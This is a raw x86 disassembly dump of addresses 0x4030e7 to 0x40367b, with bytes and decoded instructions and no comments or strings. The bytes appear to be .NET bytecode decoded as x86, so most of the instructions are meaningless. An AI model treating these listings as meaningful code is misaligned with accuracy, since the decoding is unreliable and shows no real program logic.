  4030e7:	0a 6f 8b             	or     -0x75(%edi),%ch
  4030ea:	00 00                	add    %al,(%eax)
  4030ec:	0a 16                	or     (%esi),%dl
  4030ee:	33 08                	xor    (%eax),%ecx
  4030f0:	72 4f                	jb     0x403141
  4030f2:	07                   	pop    %es
  4030f3:	00 70 0a             	add    %dh,0xa(%eax)
  4030f6:	de 41 08             	fiadds 0x8(%ecx)
  4030f9:	6f                   	outsl  %ds:(%esi),(%dx)
  4030fa:	8a 00                	mov    (%eax),%al
  4030fc:	00 0a                	add    %cl,(%edx)
  4030fe:	16                   	push   %ss
  4030ff:	08 6f 8c             	or     %ch,-0x74(%edi)
  403102:	00 00                	add    %al,(%eax)
  403104:	0a 17                	or     (%edi),%dl
  403106:	da 6f 8d             	fisubrl -0x73(%edi)
  403109:	00 00                	add    %al,(%eax)
  40310b:	0a 0a                	or     (%edx),%cl
  40310d:	de 2a                	fisubrs (%edx)
  40310f:	de 0a                	fimuls (%edx)
  403111:	07                   	pop    %es
  403112:	2c 06                	sub    $0x6,%al
  403114:	07                   	pop    %es
  403115:	6f                   	outsl  %ds:(%esi),(%dx)
  403116:	5e                   	pop    %esi
  403117:	00 00                	add    %al,(%eax)
  403119:	0a dc                	or     %ah,%bl
  40311b:	de 1c 25 28 25 00 00 	ficomps 0x2528(,%eiz,1)
  403122:	0a 13                	or     (%ebx),%dl
  403124:	04 72                	add    $0x72,%al
  403126:	4f                   	dec    %edi
  403127:	07                   	pop    %es
  403128:	00 70 0a             	add    %dh,0xa(%eax)
  40312b:	28 27                	sub    %ah,(%edi)
  40312d:	00 00                	add    %al,(%eax)
  40312f:	0a de                	or     %dh,%bl
  403131:	07                   	pop    %es
  403132:	28 27                	sub    %ah,(%edi)
  403134:	00 00                	add    %al,(%eax)
  403136:	0a de                	or     %dh,%bl
  403138:	00 06                	add    %al,(%esi)
  40313a:	2a 00                	sub    (%eax),%al
  40313c:	01 28                	add    %ebp,(%eax)
  40313e:	00 00                	add    %al,(%eax)
  403140:	02 00                	add    (%eax),%al
  403142:	25 00 45 6a 00       	and    $0x6a4500,%eax
  403147:	0c 00                	or     $0x0,%al
  403149:	00 00                	add    %al,(%eax)
  40314b:	00 02                	add    %al,(%edx)
  40314d:	00 1f                	add    %bl,(%edi)
  40314f:	00 86 a5 00 0a 00    	add    %al,0xa00a5(%esi)
  403155:	00 00                	add    %al,(%eax)
  403157:	00 00                	add    %al,(%eax)
  403159:	00 00                	add    %al,(%eax)
  40315b:	00 b1 b1 00 1c 29    	add    %dh,0x291c00b1(%ecx)
  403161:	00 00                	add    %al,(%eax)
  403163:	01 1b                	add    %ebx,(%ebx)
  403165:	30 03                	xor    %al,(%ebx)
  403167:	00 8f 00 00 00 1a    	add    %cl,0x1a000000(%edi)
  40316d:	00 00                	add    %al,(%eax)
  40316f:	11 7e 8e             	adc    %edi,-0x72(%esi)
  403172:	00 00                	add    %al,(%eax)
  403174:	0a 0d 72 59 07 00    	or     0x75972,%cl
  40317a:	70 73                	jo     0x4031ef
  40317c:	8f 00                	pop    (%eax)
  40317e:	00 0a                	add    %cl,(%edx)
  403180:	0b 07                	or     (%edi),%eax
  403182:	73 90                	jae    0x403114
  403184:	00 00                	add    %al,(%eax)
  403186:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  403189:	6f                   	outsl  %ds:(%esi),(%dx)
  40318a:	84 00                	test   %al,(%eax)
  40318c:	00 0a                	add    %cl,(%edx)
  40318e:	6f                   	outsl  %ds:(%esi),(%dx)
  40318f:	85 00                	test   %eax,(%eax)
  403191:	00 0a                	add    %cl,(%edx)
  403193:	13 05 2b 30 11 05    	adc    0x511302b,%eax
  403199:	6f                   	outsl  %ds:(%esi),(%dx)
  40319a:	86 00                	xchg   %al,(%eax)
  40319c:	00 0a                	add    %cl,(%edx)
  40319e:	74 5c                	je     0x4031fc
  4031a0:	00 00                	add    %al,(%eax)
  4031a2:	01 13                	add    %edx,(%ebx)
  4031a4:	04 09                	add    $0x9,%al
  4031a6:	11 04 72             	adc    %eax,(%edx,%esi,2)
  4031a9:	a1 07 00 70 6f       	mov    0x6f700007,%eax
  4031ae:	87 00                	xchg   %eax,(%eax)
  4031b0:	00 0a                	add    %cl,(%edx)
  4031b2:	28 91 00 00 0a 72    	sub    %dl,0x720a0000(%ecx)
  4031b8:	71 06                	jno    0x4031c0
  4031ba:	00 70 28             	add    %dh,0x28(%eax)
  4031bd:	91                   	xchg   %eax,%ecx
  4031be:	00 00                	add    %al,(%eax)
  4031c0:	0a 28                	or     (%eax),%ch
  4031c2:	23 00                	and    (%eax),%eax
  4031c4:	00 0a                	add    %cl,(%edx)
  4031c6:	0d 11 05 6f 89       	or     $0x896f0511,%eax
  4031cb:	00 00                	add    %al,(%eax)
  4031cd:	0a 2d c7 de 0c 11    	or     0x110cdec7,%ch
  4031d3:	05 2c 07 11 05       	add    $0x511072c,%eax
  4031d8:	6f                   	outsl  %ds:(%esi),(%dx)
  4031d9:	5e                   	pop    %esi
  4031da:	00 00                	add    %al,(%eax)
  4031dc:	0a dc                	or     %ah,%bl
  4031de:	09 0a                	or     %ecx,(%edx)
  4031e0:	de 1b                	ficomps (%ebx)
  4031e2:	de 19                	ficomps (%ecx)
  4031e4:	28 25 00 00 0a 72    	sub    %ah,0x720a0000
  4031ea:	b7 06                	mov    $0x6,%bh
  4031ec:	00 70 0a             	add    %dh,0xa(%eax)
  4031ef:	28 27                	sub    %ah,(%edi)
  4031f1:	00 00                	add    %al,(%eax)
  4031f3:	0a de                	or     %dh,%bl
  4031f5:	07                   	pop    %es
  4031f6:	28 27                	sub    %ah,(%edi)
  4031f8:	00 00                	add    %al,(%eax)
  4031fa:	0a de                	or     %dh,%bl
  4031fc:	00 06                	add    %al,(%esi)
  4031fe:	2a 00                	sub    (%eax),%al
  403200:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  403203:	00 02                	add    %al,(%edx)
  403205:	00 18                	add    %bl,(%eax)
  403207:	00 4a 62             	add    %cl,0x62(%edx)
  40320a:	00 0c 00             	add    %cl,(%eax,%eax,1)
  40320d:	00 00                	add    %al,(%eax)
  40320f:	00 00                	add    %al,(%eax)
  403211:	00 00                	add    %al,(%eax)
  403213:	00 74 74 00          	add    %dh,0x0(%esp,%esi,2)
  403217:	19 29                	sbb    %ebp,(%ecx)
  403219:	00 00                	add    %al,(%eax)
  40321b:	01 1b                	add    %ebx,(%ebx)
  40321d:	30 03                	xor    %al,(%ebx)
  40321f:	00 83 00 00 00 1b    	add    %al,0x1b000000(%ebx)
  403225:	00 00                	add    %al,(%eax)
  403227:	11 72 ab             	adc    %esi,-0x55(%edx)
  40322a:	07                   	pop    %es
  40322b:	00 70 73             	add    %dh,0x73(%eax)
  40322e:	92                   	xchg   %eax,%edx
  40322f:	00 00                	add    %al,(%eax)
  403231:	0a 0b                	or     (%ebx),%cl
  403233:	07                   	pop    %es
  403234:	6f                   	outsl  %ds:(%esi),(%dx)
  403235:	93                   	xchg   %eax,%ebx
  403236:	00 00                	add    %al,(%eax)
  403238:	0a 07                	or     (%edi),%al
  40323a:	72 a1                	jb     0x4031dd
  40323c:	07                   	pop    %es
  40323d:	00 70 6f             	add    %dh,0x6f(%eax)
  403240:	87 00                	xchg   %eax,(%eax)
  403242:	00 0a                	add    %cl,(%edx)
  403244:	6f                   	outsl  %ds:(%esi),(%dx)
  403245:	15 00 00 0a 72       	adc    $0x720a0000,%eax
  40324a:	eb 07                	jmp    0x403253
  40324c:	00 70 72             	add    %dh,0x72(%eax)
  40324f:	77 03                	ja     0x403254
  403251:	00 70 6f             	add    %dh,0x6f(%eax)
  403254:	76 00                	jbe    0x403256
  403256:	00 0a                	add    %cl,(%edx)
  403258:	72 f3                	jb     0x40324d
  40325a:	07                   	pop    %es
  40325b:	00 70 72             	add    %dh,0x72(%eax)
  40325e:	77 03                	ja     0x403263
  403260:	00 70 6f             	add    %dh,0x6f(%eax)
  403263:	76 00                	jbe    0x403265
  403265:	00 0a                	add    %cl,(%edx)
  403267:	72 05                	jb     0x40326e
  403269:	08 00                	or     %al,(%eax)
  40326b:	70 72                	jo     0x4032df
  40326d:	77 03                	ja     0x403272
  40326f:	00 70 6f             	add    %dh,0x6f(%eax)
  403272:	76 00                	jbe    0x403274
  403274:	00 0a                	add    %cl,(%edx)
  403276:	0a de                	or     %dh,%bl
  403278:	30 07                	xor    %al,(%edi)
  40327a:	72 a1                	jb     0x40321d
  40327c:	07                   	pop    %es
  40327d:	00 70 6f             	add    %dh,0x6f(%eax)
  403280:	87 00                	xchg   %eax,(%eax)
  403282:	00 0a                	add    %cl,(%edx)
  403284:	6f                   	outsl  %ds:(%esi),(%dx)
  403285:	15 00 00 0a 0a       	adc    $0xa0a0000,%eax
  40328a:	de 1d de 1b 25 28    	ficomps 0x28251bde
  403290:	25 00 00 0a 0c       	and    $0xc0a0000,%eax
  403295:	72 b7                	jb     0x40324e
  403297:	06                   	push   %es
  403298:	00 70 0a             	add    %dh,0xa(%eax)
  40329b:	28 27                	sub    %ah,(%edi)
  40329d:	00 00                	add    %al,(%eax)
  40329f:	0a de                	or     %dh,%bl
  4032a1:	07                   	pop    %es
  4032a2:	28 27                	sub    %ah,(%edi)
  4032a4:	00 00                	add    %al,(%eax)
  4032a6:	0a de                	or     %dh,%bl
  4032a8:	00 06                	add    %al,(%esi)
  4032aa:	2a 00                	sub    (%eax),%al
  4032ac:	01 10                	add    %edx,(%eax)
  4032ae:	00 00                	add    %al,(%eax)
  4032b0:	00 00                	add    %al,(%eax)
  4032b2:	00 00                	add    %al,(%eax)
  4032b4:	66 66 00 1b          	data16 data16 add %bl,(%ebx)
  4032b8:	29 00                	sub    %eax,(%eax)
  4032ba:	00 01                	add    %al,(%ecx)
  4032bc:	1b 30                	sbb    (%eax),%esi
  4032be:	04 00                	add    $0x0,%al
  4032c0:	b9 00 00 00 1c       	mov    $0x1c000000,%ecx
  4032c5:	00 00                	add    %al,(%eax)
  4032c7:	11 14 0c             	adc    %edx,(%esp,%ecx,1)
  4032ca:	28 04 00             	sub    %al,(%eax,%eax,1)
  4032cd:	00 06                	add    %al,(%esi)
  4032cf:	6f                   	outsl  %ds:(%esi),(%dx)
  4032d0:	94                   	xchg   %eax,%esp
  4032d1:	00 00                	add    %al,(%eax)
  4032d3:	0a 6f 95             	or     -0x6b(%edi),%ch
  4032d6:	00 00                	add    %al,(%eax)
  4032d8:	0a 8c 5d 00 00 01 28 	or     0x28010000(%ebp,%ebx,2),%cl
  4032df:	96                   	xchg   %eax,%esi
  4032e0:	00 00                	add    %al,(%eax)
  4032e2:	0a 28                	or     (%eax),%ch
  4032e4:	97                   	xchg   %eax,%edi
  4032e5:	00 00                	add    %al,(%eax)
  4032e7:	0a b9 0b 07 20 00    	or     0x20070b(%ecx),%bh
  4032ed:	00 00                	add    %al,(%eax)
  4032ef:	40                   	inc    %eax
  4032f0:	6a 31                	push   $0x31
  4032f2:	32 07                	xor    (%edi),%al
  4032f4:	6c                   	insb   (%dx),%es:(%edi)
  4032f5:	23 00                	and    (%eax),%eax
  4032f7:	00 00                	add    %al,(%eax)
  4032f9:	00 00                	add    %al,(%eax)
  4032fb:	00 d0                	add    %dl,%al
  4032fd:	41                   	inc    %ecx
  4032fe:	5b                   	pop    %ebx
  4032ff:	13 04 12             	adc    (%edx,%edx,1),%eax
  403302:	04 28                	add    $0x28,%al
  403304:	98                   	cwtl
  403305:	00 00                	add    %al,(%eax)
  403307:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  40330a:	1a 08                	sbb    (%eax),%cl
  40330c:	6f                   	outsl  %ds:(%esi),(%dx)
  40330d:	8b 00                	mov    (%eax),%eax
  40330f:	00 0a                	add    %cl,(%edx)
  403311:	1a da                	sbb    %dl,%bl
  403313:	6f                   	outsl  %ds:(%esi),(%dx)
  403314:	99                   	cltd
  403315:	00 00                	add    %al,(%eax)
  403317:	0a 72 0d             	or     0xd(%edx),%dh
  40331a:	08 00                	or     %al,(%eax)
  40331c:	70 28                	jo     0x403346
  40331e:	1f                   	pop    %ds
  40331f:	00 00                	add    %al,(%eax)
  403321:	0a 0c 2b             	or     (%ebx,%ebp,1),%cl
  403324:	39 07                	cmp    %eax,(%edi)
  403326:	20 00                	and    %al,(%eax)
  403328:	00 10                	add    %dl,(%eax)
  40332a:	00 6a 31             	add    %ch,0x31(%edx)
  40332d:	30 07                	xor    %al,(%edi)
  40332f:	6c                   	insb   (%dx),%es:(%edi)
  403330:	23 00                	and    (%eax),%eax
  403332:	00 00                	add    %al,(%eax)
  403334:	00 00                	add    %al,(%eax)
  403336:	00 30                	add    %dh,(%eax)
  403338:	41                   	inc    %ecx
  403339:	5b                   	pop    %ebx
  40333a:	13 04 12             	adc    (%edx,%edx,1),%eax
  40333d:	04 28                	add    $0x28,%al
  40333f:	98                   	cwtl
  403340:	00 00                	add    %al,(%eax)
  403342:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  403345:	1a 08                	sbb    (%eax),%cl
  403347:	6f                   	outsl  %ds:(%esi),(%dx)
  403348:	8b 00                	mov    (%eax),%eax
  40334a:	00 0a                	add    %cl,(%edx)
  40334c:	1a da                	sbb    %dl,%bl
  40334e:	6f                   	outsl  %ds:(%esi),(%dx)
  40334f:	99                   	cltd
  403350:	00 00                	add    %al,(%eax)
  403352:	0a 72 15             	or     0x15(%edx),%dh
  403355:	08 00                	or     %al,(%eax)
  403357:	70 28                	jo     0x403381
  403359:	1f                   	pop    %ds
  40335a:	00 00                	add    %al,(%eax)
  40335c:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  40335f:	0a de                	or     %dh,%bl
  403361:	1d de 1b 25 28       	sbb    $0x28251bde,%eax
  403366:	25 00 00 0a 0d       	and    $0xd0a0000,%eax
  40336b:	72 b7                	jb     0x403324
  40336d:	06                   	push   %es
  40336e:	00 70 0a             	add    %dh,0xa(%eax)
  403371:	28 27                	sub    %ah,(%edi)
  403373:	00 00                	add    %al,(%eax)
  403375:	0a de                	or     %dh,%bl
  403377:	07                   	pop    %es
  403378:	28 27                	sub    %ah,(%edi)
  40337a:	00 00                	add    %al,(%eax)
  40337c:	0a de                	or     %dh,%bl
  40337e:	00 06                	add    %al,(%esi)
  403380:	2a 00                	sub    (%eax),%al
  403382:	00 00                	add    %al,(%eax)
  403384:	01 10                	add    %edx,(%eax)
  403386:	00 00                	add    %al,(%eax)
  403388:	00 00                	add    %al,(%eax)
  40338a:	00 00                	add    %al,(%eax)
  40338c:	9c                   	pushf
  40338d:	9c                   	pushf
  40338e:	00 1b                	add    %bl,(%ebx)
  403390:	29 00                	sub    %eax,(%eax)
  403392:	00 01                	add    %al,(%ecx)
  403394:	1b 30                	sbb    (%eax),%esi
  403396:	08 00                	or     %al,(%eax)
  403398:	c5 01                	lds    (%ecx),%eax
  40339a:	00 00                	add    %al,(%eax)
  40339c:	1d 00 00 11 7e       	sbb    $0x7e110000,%eax
  4033a1:	12 00                	adc    (%eax),%al
  4033a3:	00 04 2d 05 38 b8 01 	add    %al,0x1b83805(,%ebp,1)
  4033aa:	00 00                	add    %al,(%eax)
  4033ac:	7e 13                	jle    0x4033c1
  4033ae:	00 00                	add    %al,(%eax)
  4033b0:	04 02                	add    $0x2,%al
  4033b2:	6f                   	outsl  %ds:(%esi),(%dx)
  4033b3:	9a 00 00 0a 0a 06 16 	lcall  $0x1606,$0xa0a0000
  4033ba:	3e 56                	ds push %esi
  4033bc:	01 00                	add    %eax,(%eax)
  4033be:	00 7e 14             	add    %bh,0x14(%esi)
  4033c1:	00 00                	add    %al,(%eax)
  4033c3:	04 15                	add    $0x15,%al
  4033c5:	6a 40                	push   $0x40
  4033c7:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4033c8:	00 00                	add    %al,(%eax)
  4033ca:	00 7e 15             	add    %bh,0x15(%esi)
  4033cd:	00 00                	add    %al,(%eax)
  4033cf:	04 16                	add    $0x16,%al
  4033d1:	91                   	xchg   %eax,%ecx
  4033d2:	16                   	push   %ss
  4033d3:	40                   	inc    %eax
  4033d4:	83 00 00             	addl   $0x0,(%eax)
  4033d7:	00 7e 16             	add    %bh,0x16(%esi)
  4033da:	00 00                	add    %al,(%eax)
  4033dc:	04 6f                	add    $0x6f,%al
  4033de:	9b                   	fwait
  4033df:	00 00                	add    %al,(%eax)
  4033e1:	0a 28                	or     (%eax),%ch
  4033e3:	6d                   	insl   (%dx),%es:(%edi)
  4033e4:	00 00                	add    %al,(%eax)
  4033e6:	06                   	push   %es
  4033e7:	28 9c 00 00 0a 80 14 	sub    %bl,0x14800a00(%eax,%eax,1)
  4033ee:	00 00                	add    %al,(%eax)
  4033f0:	04 7e                	add    $0x7e,%al
  4033f2:	16                   	push   %ss
  4033f3:	00 00                	add    %al,(%eax)
  4033f5:	04 6f                	add    $0x6f,%al
  4033f7:	9d                   	popf
  4033f8:	00 00                	add    %al,(%eax)
  4033fa:	0a 73 6c             	or     0x6c(%ebx),%dh
  4033fd:	00 00                	add    %al,(%eax)
  4033ff:	0a 80 16 00 00 04    	or     0x4000016(%eax),%al
  403405:	7e 14                	jle    0x40341b
  403407:	00 00                	add    %al,(%eax)
  403409:	04 16                	add    $0x16,%al
  40340b:	6a 33                	push   $0x33
  40340d:	36 15 6a 80 14 00    	ss adc $0x14806a,%eax
  403413:	00 04 7e             	add    %al,(%esi,%edi,2)
  403416:	13 00                	adc    (%eax),%eax
  403418:	00 04 7e             	add    %al,(%esi,%edi,2)
  40341b:	15 00 00 04 16       	adc    $0x16040000,%eax
  403420:	7e 15                	jle    0x403437
  403422:	00 00                	add    %al,(%eax)
  403424:	04 8e                	add    $0x8e,%al
  403426:	b7 16                	mov    $0x16,%bh
  403428:	14 fe                	adc    $0xfe,%al
  40342a:	06                   	push   %es
  40342b:	2d 00 00 06 73       	sub    $0x73060000,%eax
  403430:	70 00                	jo     0x403432
  403432:	00 0a                	add    %cl,(%edx)
  403434:	7e 13                	jle    0x403449
  403436:	00 00                	add    %al,(%eax)
  403438:	04 6f                	add    $0x6f,%al
  40343a:	71 00                	jno    0x40343c
  40343c:	00 0a                	add    %cl,(%edx)
  40343e:	26 dd 20             	frstor %es:(%eax)
  403441:	01 00                	add    %eax,(%eax)
  403443:	00 7e 14             	add    %bh,0x14(%esi)
  403446:	00 00                	add    %al,(%eax)
  403448:	04 17                	add    $0x17,%al
  40344a:	6a da                	push   $0xffffffda
  40344c:	b7 17                	mov    $0x17,%bh
  40344e:	d6                   	salc
  40344f:	8d 4f 00             	lea    0x0(%edi),%ecx
  403452:	00 01                	add    %al,(%ecx)
  403454:	80 15 00 00 04 2b 11 	adcb   $0x11,0x2b040000
  40345b:	7e 16                	jle    0x403473
  40345d:	00 00                	add    %al,(%eax)
  40345f:	04 7e                	add    $0x7e,%al
  403461:	15 00 00 04 16       	adc    $0x16040000,%eax
  403466:	91                   	xchg   %eax,%ecx
  403467:	6f                   	outsl  %ds:(%esi),(%dx)
  403468:	9e                   	sahf
  403469:	00 00                	add    %al,(%eax)
  40346b:	0a 38                	or     (%eax),%bh
  40346d:	a2 00 00 00 7e       	mov    %al,0x7e000000
  403472:	16                   	push   %ss
  403473:	00 00                	add    %al,(%eax)
  403475:	04 7e                	add    $0x7e,%al
  403477:	15 00 00 04 16       	adc    $0x16040000,%eax
  40347c:	06                   	push   %es
  40347d:	6f                   	outsl  %ds:(%esi),(%dx)
  40347e:	9f                   	lahf
  40347f:	00 00                	add    %al,(%eax)
  403481:	0a 7e 16             	or     0x16(%esi),%bh
  403484:	00 00                	add    %al,(%eax)
  403486:	04 6f                	add    $0x6f,%al
  403488:	a0 00 00 0a 7e       	mov    0x7e0a0000,%al
  40348d:	14 00                	adc    $0x0,%al
  40348f:	00 04 33             	add    %al,(%ebx,%esi,1)
  403492:	60                   	pusha
  403493:	14 fe                	adc    $0xfe,%al
  403495:	06                   	push   %es
  403496:	35 00 00 06 73       	xor    $0x73060000,%eax
  40349b:	a1 00 00 0a 73       	mov    0x730a0000,%eax
  4034a0:	a2 00 00 0a 0b       	mov    %al,0xb0a0000
  4034a5:	07                   	pop    %es
  4034a6:	14 72                	adc    $0x72,%al
  4034a8:	1d 08 00 70 17       	sbb    $0x17700008,%eax
  4034ad:	8d 03                	lea    (%ebx),%eax
  4034af:	00 00                	add    %al,(%eax)
  4034b1:	01 0d 09 16 7e 16    	add    %ecx,0x167e1609
  4034b7:	00 00                	add    %al,(%eax)
  4034b9:	04 6f                	add    $0x6f,%al
  4034bb:	9b                   	fwait
  4034bc:	00 00                	add    %al,(%eax)
  4034be:	0a a2 09 14 14 14    	or     0x14141409(%edx),%ah
  4034c4:	17                   	pop    %ss
  4034c5:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  4034c9:	0a 26                	or     (%esi),%ah
  4034cb:	15 6a 80 14 00       	adc    $0x14806a,%eax
  4034d0:	00 04 7e             	add    %al,(%esi,%edi,2)
  4034d3:	16                   	push   %ss
  4034d4:	00 00                	add    %al,(%eax)
  4034d6:	04 6f                	add    $0x6f,%al
  4034d8:	9d                   	popf
  4034d9:	00 00                	add    %al,(%eax)
  4034db:	0a 73 6c             	or     0x6c(%ebx),%dh
  4034de:	00 00                	add    %al,(%eax)
  4034e0:	0a 80 16 00 00 04    	or     0x4000016(%eax),%al
  4034e6:	17                   	pop    %ss
  4034e7:	8d 4f 00             	lea    0x0(%edi),%ecx
  4034ea:	00 01                	add    %al,(%ecx)
  4034ec:	80 15 00 00 04 2b 20 	adcb   $0x20,0x2b040000
  4034f3:	7e 14                	jle    0x403509
  4034f5:	00 00                	add    %al,(%eax)
  4034f7:	04 7e                	add    $0x7e,%al
  4034f9:	16                   	push   %ss
  4034fa:	00 00                	add    %al,(%eax)
  4034fc:	04 6f                	add    $0x6f,%al
  4034fe:	a0 00 00 0a da       	mov    0xda0a0000,%al
  403503:	17                   	pop    %ss
  403504:	6a da                	push   $0xffffffda
  403506:	b7 17                	mov    $0x17,%bh
  403508:	d6                   	salc
  403509:	8d 4f 00             	lea    0x0(%edi),%ecx
  40350c:	00 01                	add    %al,(%ecx)
  40350e:	80 15 00 00 04 2b 08 	adcb   $0x8,0x2b040000
  403515:	16                   	push   %ss
  403516:	80 12 00             	adcb   $0x0,(%edx)
  403519:	00 04 de             	add    %al,(%esi,%ebx,8)
  40351c:	47                   	inc    %edi
  40351d:	7e 13                	jle    0x403532
  40351f:	00 00                	add    %al,(%eax)
  403521:	04 7e                	add    $0x7e,%al
  403523:	15 00 00 04 16       	adc    $0x16040000,%eax
  403528:	7e 15                	jle    0x40353f
  40352a:	00 00                	add    %al,(%eax)
  40352c:	04 8e                	add    $0x8e,%al
  40352e:	b7 16                	mov    $0x16,%bh
  403530:	14 fe                	adc    $0xfe,%al
  403532:	06                   	push   %es
  403533:	2d 00 00 06 73       	sub    $0x73060000,%eax
  403538:	70 00                	jo     0x40353a
  40353a:	00 0a                	add    %cl,(%edx)
  40353c:	7e 13                	jle    0x403551
  40353e:	00 00                	add    %al,(%eax)
  403540:	04 6f                	add    $0x6f,%al
  403542:	71 00                	jno    0x403544
  403544:	00 0a                	add    %cl,(%edx)
  403546:	26 de 1b             	ficomps %es:(%ebx)
  403549:	25 28 25 00 00       	and    $0x2528,%eax
  40354e:	0a 0c 16             	or     (%esi,%edx,1),%cl
  403551:	80 12 00             	adcb   $0x0,(%edx)
  403554:	00 04 28             	add    %al,(%eax,%ebp,1)
  403557:	27                   	daa
  403558:	00 00                	add    %al,(%eax)
  40355a:	0a de                	or     %dh,%bl
  40355c:	07                   	pop    %es
  40355d:	28 27                	sub    %ah,(%edi)
  40355f:	00 00                	add    %al,(%eax)
  403561:	0a de                	or     %dh,%bl
  403563:	00 2a                	add    %ch,(%edx)
  403565:	00 00                	add    %al,(%eax)
  403567:	00 41 1c             	add    %al,0x1c(%ecx)
  40356a:	00 00                	add    %al,(%eax)
  40356c:	00 00                	add    %al,(%eax)
  40356e:	00 00                	add    %al,(%eax)
  403570:	0c 00                	or     $0x0,%al
  403572:	00 00                	add    %al,(%eax)
  403574:	9d                   	popf
  403575:	01 00                	add    %eax,(%eax)
  403577:	00 a9 01 00 00 1b    	add    %ch,0x1b000001(%ecx)
  40357d:	00 00                	add    %al,(%eax)
  40357f:	00 29                	add    %ch,(%ecx)
  403581:	00 00                	add    %al,(%eax)
  403583:	01 1b                	add    %ebx,(%ebx)
  403585:	30 02                	xor    %al,(%edx)
  403587:	00 17                	add    %dl,(%edi)
  403589:	00 00                	add    %al,(%eax)
  40358b:	00 1e                	add    %bl,(%esi)
  40358d:	00 00                	add    %al,(%eax)
  40358f:	11 02                	adc    %eax,(%edx)
  403591:	28 37                	sub    %dh,(%edi)
  403593:	00 00                	add    %al,(%eax)
  403595:	06                   	push   %es
  403596:	de 0e                	fimuls (%esi)
  403598:	25 28 25 00 00       	and    $0x2528,%eax
  40359d:	0a 0a                	or     (%edx),%cl
  40359f:	28 27                	sub    %ah,(%edi)
  4035a1:	00 00                	add    %al,(%eax)
  4035a3:	0a de                	or     %dh,%bl
  4035a5:	00 2a                	add    %ch,(%edx)
  4035a7:	00 01                	add    %al,(%ecx)
  4035a9:	10 00                	adc    %al,(%eax)
  4035ab:	00 00                	add    %al,(%eax)
  4035ad:	00 00                	add    %al,(%eax)
  4035af:	00 08                	add    %cl,(%eax)
  4035b1:	08 00                	or     %al,(%eax)
  4035b3:	0e                   	push   %cs
  4035b4:	29 00                	sub    %eax,(%eax)
  4035b6:	00 01                	add    %al,(%ecx)
  4035b8:	1b 30                	sbb    (%eax),%esi
  4035ba:	07                   	pop    %es
  4035bb:	00 c9                	add    %cl,%cl
  4035bd:	00 00                	add    %al,(%eax)
  4035bf:	00 1f                	add    %bl,(%edi)
  4035c1:	00 00                	add    %al,(%eax)
  4035c3:	11 7e 19             	adc    %edi,0x19(%esi)
  4035c6:	00 00                	add    %al,(%eax)
  4035c8:	04 13                	add    $0x13,%al
  4035ca:	04 11                	add    $0x11,%al
  4035cc:	04 28                	add    $0x28,%al
  4035ce:	a3 00 00 0a 16       	mov    %eax,0x160a0000
  4035d3:	13 05 11 04 12 05    	adc    0x5120411,%eax
  4035d9:	28 a4 00 00 0a 7e 12 	sub    %ah,0x127e0a00(%eax,%eax,1)
  4035e0:	00 00                	add    %al,(%eax)
  4035e2:	04 39                	add    $0x39,%al
  4035e4:	96                   	xchg   %eax,%esi
  4035e5:	00 00                	add    %al,(%eax)
  4035e7:	00 73 6c             	add    %dh,0x6c(%ebx)
  4035ea:	00 00                	add    %al,(%eax)
  4035ec:	0a 0a                	or     (%edx),%cl
  4035ee:	02 28                	add    (%eax),%ch
  4035f0:	6c                   	insb   (%dx),%es:(%edi)
  4035f1:	00 00                	add    %al,(%eax)
  4035f3:	06                   	push   %es
  4035f4:	28 74 00 00          	sub    %dh,0x0(%eax,%eax,1)
  4035f8:	06                   	push   %es
  4035f9:	0b 07                	or     (%edi),%eax
  4035fb:	8e b7 28 a5 00 00    	mov    0xa528(%edi),%?
  403601:	0a 72 29             	or     0x29(%edx),%dh
  403604:	08 00                	or     %al,(%eax)
  403606:	70 28                	jo     0x403630
  403608:	1f                   	pop    %ds
  403609:	00 00                	add    %al,(%eax)
  40360b:	0a 28                	or     (%eax),%ch
  40360d:	6c                   	insb   (%dx),%es:(%edi)
  40360e:	00 00                	add    %al,(%eax)
  403610:	06                   	push   %es
  403611:	0c 06                	or     $0x6,%al
  403613:	08 16                	or     %dl,(%esi)
  403615:	08 8e b7 6f 9f 00    	or     %cl,0x9f6fb7(%esi)
  40361b:	00 0a                	add    %cl,(%edx)
  40361d:	06                   	push   %es
  40361e:	07                   	pop    %es
  40361f:	16                   	push   %ss
  403620:	07                   	pop    %es
  403621:	8e b7 6f 9f 00 00    	mov    0x9f6f(%edi),%?
  403627:	0a 7e 13             	or     0x13(%esi),%bh
  40362a:	00 00                	add    %al,(%eax)
  40362c:	04 15                	add    $0x15,%al
  40362e:	17                   	pop    %ss
  40362f:	6f                   	outsl  %ds:(%esi),(%dx)
  403630:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  403631:	00 00                	add    %al,(%eax)
  403633:	0a 26                	or     (%esi),%ah
  403635:	7e 13                	jle    0x40364a
  403637:	00 00                	add    %al,(%eax)
  403639:	04 06                	add    $0x6,%al
  40363b:	6f                   	outsl  %ds:(%esi),(%dx)
  40363c:	9b                   	fwait
  40363d:	00 00                	add    %al,(%eax)
  40363f:	0a 16                	or     (%esi),%dl
  403641:	06                   	push   %es
  403642:	6f                   	outsl  %ds:(%esi),(%dx)
  403643:	a0 00 00 0a b7       	mov    0xb70a0000,%al
  403648:	16                   	push   %ss
  403649:	14 fe                	adc    $0xfe,%al
  40364b:	06                   	push   %es
  40364c:	30 00                	xor    %al,(%eax)
  40364e:	00 06                	add    %al,(%esi)
  403650:	73 70                	jae    0x4036c2
  403652:	00 00                	add    %al,(%eax)
  403654:	0a 14 6f             	or     (%edi,%ebp,2),%dl
  403657:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  403658:	00 00                	add    %al,(%eax)
  40365a:	0a 26                	or     (%esi),%ah
  40365c:	de 0a                	fimuls (%edx)
  40365e:	06                   	push   %es
  40365f:	2c 06                	sub    $0x6,%al
  403661:	06                   	push   %es
  403662:	6f                   	outsl  %ds:(%esi),(%dx)
  403663:	5e                   	pop    %esi
  403664:	00 00                	add    %al,(%eax)
  403666:	0a dc                	or     %ah,%bl
  403668:	de 14 25 28 25 00 00 	ficoms 0x2528(,%eiz,1)
  40366f:	0a 0d 16 80 12 00    	or     0x128016,%cl
  403675:	00 04 28             	add    %al,(%eax,%ebp,1)
  403678:	27                   	daa
  403679:	00 00                	add    %al,(%eax)
  40367b:	0a de                	or     %dh,%bl
